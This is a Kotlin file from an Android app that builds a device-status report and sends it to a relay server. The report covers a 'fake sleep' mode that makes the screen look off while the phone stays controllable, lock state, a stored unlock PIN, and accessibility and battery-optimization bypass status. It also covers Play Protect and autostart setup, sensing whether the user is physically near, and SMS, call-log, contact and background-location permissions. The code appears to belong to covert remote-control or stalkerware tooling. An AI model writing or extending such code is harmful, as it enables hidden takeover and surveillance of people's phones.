package com.phonehand.app

import android.content.Context
import org.json.JSONObject

object DeviceStateReporter {
    fun build(context: Context): JSONObject {
        val fakeSleep = FakeSleepMode.isEnabled(context)
        val interactive = ScreenPower.isInteractive(context)
        val locked = LockScreenHelper.isKeyguardLocked(context)
        val a11y = WatchSync.isEnabled(context)
        val ready = a11y && RelayHub.relayConnected &&
            (fakeSleep || (interactive && !LockScreenHelper.isDeviceLocked(context)))
        val perms = JSONObject()
            .put("location", PermissionRequester.has(context, android.Manifest.permission.ACCESS_FINE_LOCATION))
            .put("background_location", PermissionRequester.has(context, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION))
            .put("contacts", PermissionRequester.has(context, android.Manifest.permission.READ_CONTACTS))
            .put("sms", PermissionRequester.has(context, android.Manifest.permission.READ_SMS))
            .put("call_log", PermissionRequester.has(context, android.Manifest.permission.READ_CALL_LOG))
        return JSONObject()
            .put("type", "device_state")
            .put("awake", interactive && !fakeSleep)
            .put("fake_sleep", fakeSleep)
            .put("locked", locked)
            .put("ready", ready)
            .put("has_pin", UnlockStore.hasPin(context))
            .put("accessibility", a11y)
            .put("battery_unrestricted", !PersistenceHelper.isBatteryOptimized(context))
            .put("relay_connected", RelayHub.relayConnected)
            .put("play_protect_setup", UserSession.playProtectPromptDone(context))
            .put("autostart_setup", UserSession.autostartPromptDone(context))
            .put("manufacturer", OemPersistenceGrant.manufacturer())
            .put("proximity_available", UserProximityMonitor.isAvailable(context))
            .put("proximity_auto_sleep", ProximityGuard.isAutoEnabled(context))
            .put("user_near", if (UserProximityMonitor.isMonitoring()) UserProximityMonitor.isUserNear() else JSONObject.NULL)
            .put("last_near_at", UserProximityMonitor.lastNearAt())
            .put("last_far_at", UserProximityMonitor.lastFarAt())
            .put("perms", perms)
    }

    fun send(context: Context) {
        RelayHub.client?.sendJson(build(context))
    }
}
